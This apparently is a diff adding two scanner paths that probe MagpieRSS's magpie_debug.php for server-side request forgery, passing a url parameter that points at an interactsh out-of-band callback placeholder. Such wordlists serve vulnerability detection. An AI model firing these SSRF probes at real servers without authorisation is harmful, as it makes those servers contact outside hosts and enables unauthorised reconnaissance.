@@ -1,0 +1,2 @@
+/usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
+/html/usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
